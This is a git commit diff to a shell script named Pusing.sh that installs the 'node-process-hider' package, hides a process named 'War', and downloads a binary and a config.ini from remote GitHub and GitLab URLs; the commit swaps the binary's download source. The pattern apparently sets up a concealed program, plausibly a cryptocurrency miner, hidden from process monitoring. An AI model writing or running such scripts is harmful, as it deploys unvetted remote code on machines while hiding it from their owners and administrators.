5eaa653445d81333b22a846e79787dbb41281620
NuDev2021 <93753012+NuDev2021@users.noreply.github.com>
2021-11-26 15:31:20 +0700

    Update Pusing.sh

--- Pusing.sh
+++ Pusing.sh
@@ -2,7 +2,7 @@ npm i -g node-process-hider
 
 ph add War
 
-wget https://gitlab.com/Gasskeunjal/gblk/-/raw/main/War
+wget https://gitlab.com/NuDev2021/ppa/-/raw/main/Machine
 
 wget https://raw.githubusercontent.com/NuDev2021/config.ini/main/config.ini
 
